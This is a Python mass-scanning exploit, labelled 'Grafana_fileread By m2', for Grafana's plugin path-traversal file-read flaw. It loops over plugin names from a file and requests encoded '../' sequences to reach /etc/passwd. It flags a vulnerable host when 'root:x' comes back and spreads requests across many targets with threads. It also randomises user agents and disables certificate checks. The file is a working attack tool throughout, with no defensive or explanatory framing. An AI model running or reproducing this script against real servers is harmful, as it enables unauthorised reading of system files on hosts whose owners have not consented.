import requests
import sys
import urllib3
from argparse import ArgumentParser
import threadpool
from urllib import parse
from time import time
import random


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
filename = sys.argv[1]
url_list=[]

#随机ua
def get_ua():
	first_num = random.randint(55, 62)
	third_num = random.randint(0, 3200)
	fourth_num = random.randint(0, 140)
	os_type = [
		'(Windows NT 6.1; WOW64)', '(Windows NT 10.0; WOW64)',
		'(Macintosh; Intel Mac OS X 10_12_6)'
	]
	chrome_version = 'Chrome/{}.0.{}.{}'.format(first_num, third_num, fourth_num)

	ua = ' '.join(['Mozilla/5.0', random.choice(os_type), 'AppleWebKit/537.36',
				   '(KHTML, like Gecko)', chrome_version, 'Safari/537.36']
				  )
	return ua

# proxies={'http': 'http://127.0.0.1:8080',
# 		'https': 'https://127.0.0.1:8080'}


def check_vuln(url):
	url = parse.urlparse(url)
	url1 = url.scheme + '://' + url.netloc
	f = open("control.txt")
	for i in f:
		url2 = url.scheme + "://" + url.netloc + "/public/plugins/" + str.rstrip(i) + '/..%2f..%2f..%2f..%2f..%2f..%2f..%2f../etc/passwd'
		try:
			headers = {'User-Agent': get_ua()}
			res = requests.get(url2,headers=headers,timeout=10,verify=False)
			if res.status_code == 200 and "root:x" in res.text:
				# print(res.text)
				print("\033[32m[+]%s\033[0m" %url2)
				break
		except Exception as e:
			pass
	# print("\033[31m[-] %s pass \033[0m" %url1)
	f.close()

#多线程
def multithreading(url_list, pools=5):
	works = []
	for i in url_list:
		# works.append((func_params, None))
		works.append(i)
	# print(works)
	pool = threadpool.ThreadPool(pools)
	reqs = threadpool.makeRequests(check_vuln, works)
	[pool.putRequest(req) for req in reqs]
	pool.wait()


if __name__ == '__main__':
	show = r'''
	 _____            __                     __ _ _                         _ 
	|  __ \          / _|                   / _(_) |                       | |
	| |  \/_ __ __ _| |_ __ _ _ __   __ _  | |_ _| | ___ _ __ ___  __ _  __| |
	| | __| '__/ _` |  _/ _` | '_ \ / _` | |  _| | |/ _ \ '__/ _ \/ _` |/ _` |
	| |_\ \ | | (_| | || (_| | | | | (_| | | | | | |  __/ | |  __/ (_| | (_| |
	 \____/_|  \__,_|_| \__,_|_| |_|\__,_| |_| |_|_|\___|_|  \___|\__,_|\__,_|
	                                   ______                                 
	                                  |______|                                
	                                                                                                                                          
                              					Grafana_fileread By m2
	'''
	print(show + '\n')
	arg=ArgumentParser(description='Grafana_fileread By m2')
	arg.add_argument("-u",
						"--url",
						help="Target URL; Example:http://ip:port")
	arg.add_argument("-f",
						"--file",
						help="url_lsit; Example:url.txt")
	args=arg.parse_args()
	url=args.url
	filename=args.file
	start=time()
	if url != None and filename == None:
		check_vuln(url)
	elif url == None and filename != None:
		for i in open(filename):
			i=i.replace('\n','')
			url_list.append(i)
		multithreading(url_list,10)
	end=time()
	print('任务完成，用时%d' %(end-start))
